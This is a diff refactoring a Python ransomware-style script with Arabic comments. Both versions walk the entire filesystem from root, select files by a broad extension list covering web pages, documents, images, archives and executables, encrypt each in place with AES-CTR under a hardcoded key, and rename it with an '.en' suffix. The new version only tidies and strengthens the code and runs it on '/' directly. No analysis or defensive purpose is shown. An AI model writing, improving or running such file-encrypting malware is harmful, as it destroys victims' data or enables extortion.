@@ -1,63 +1,53 @@
-import os.path
-
 import os
-
-from Crypto.Cipher import AES 
-
+from Crypto.Cipher import AES
 from Crypto import Random
-
 from Crypto.Util import Counter
 
+# قائمة الامتدادات المستهدفة
+ex_list = [
+    '.php', '.html', '.txt', '.htm', '.aspx', '.asp', '.js', '.css', '.pgsql.txt',
+    '.mysql.txt', '.pdf', '.cgi', '.inc', '.gif', '.jpg', '.swf', '.xml', '.cfm',
+    '.xhtml', '.wmv', '.zip', '.axd', '.gz', '.png', '.doc', '.shtml', '.jsp', 
+    '.ico', '.exe', '.csi', '.inc.php', '.config', '.jpeg', '.ashx', '.log', 
+    '.xls', '.0', '.old', '.mp3', '.com', '.tar', '.ini', '.mp4', '.en'
+]
 
-ex_list=['.php', '.html', '.txt', '.htm', '.aspx', '.asp', '.js', '.css', '.pgsql.txt', '.mysql.txt', '.pdf', '.cgi', '.inc', '.gif', '.jpg', '.swf', '.xml', '.cfm', '.xhtml', '.wmv', '.zip', '.axd', '.gz', '.png', '.doc', '.shtml', '.jsp', '.ico', '.exe', '.csi', '.inc.php', '.config', '.jpeg', '.ashx', '.log', '.xls', '.0', '.old', '.mp3', '.com', '.tar', '.ini','mp4','en']
-new_list=[]
+# إزالة النقطة من الامتدادات مرة واحدة بكفاءة
+target_extensions = {ext.lstrip('.').lower() for ext in ex_list}
 
-power_list=[]
+# تشفير الملفات
+def encrypt_file(file_path, key):
+    block_size = 16
+    iv = Random.get_random_bytes(8)  # CTR mode needs a nonce
+    ctr = Counter.new(64, prefix=iv)
+    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
 
-for i in ex_list:
+    try:
+        with open(file_path, "rb") as f:
+            plaintext = f.read()
 
-    i1=i.strip('.')
+        ciphertext = cipher.encrypt(plaintext)
 
-    new_list.append(i1)
+        with open(file_path, "wb") as f:
+            f.write(iv + ciphertext)  # حفظ الـ IV في بداية الملف
 
-for d,sd,f in os.walk('/'):
+        os.rename(file_path, file_path + ".en")
 
-    for files in f:
+    except Exception as e:
+        print(f"[!] خطأ في الملف: {file_path} -> {e}")
 
-        path=os.path.join(d,files)
+# البحث عن الملفات المستهدفة وتشفيرها
+def find_and_encrypt_files(start_path='/', key=b'1111111111111111'):
+    for root, dirs, files in os.walk(start_path):
+        for file_name in files:
+            extension = file_name.rsplit('.', 1)[-1].lower()
+            if extension in target_extensions:
+                full_path = os.path.join(root, file_name)
+                encrypt_file(full_path, key)
 
-        end=path.split(".")[-1]
+# المفتاح المستخدم
+key = b'1111111111111111'
 
-        if end in new_list:
+# تشغيل البرنامج
+find_and_encrypt_files('/')
 
-            power_list.append(path)
-
-
-counter=Counter.new(128)
-
-
-def encryption(o_file,key):
-
-    block_size=16
-
-    c=AES.new(key,AES.MODE_CTR,counter=counter)
-
-    with open(o_file,"r+b")as file:
-
-        plaintext=file.read(block_size)
-
-        while plaintext:
-
-            file.seek(-len(plaintext),1)
-
-            file.write(c.encrypt(plaintext))
-
-            plaintext=file.read(block_size)
-
-    os.rename(o_file,o_file+'.en')
-
-key='1111111111111111'.encode('ascii')
-
-for item in power_list:
-
-    encryption(item,key)
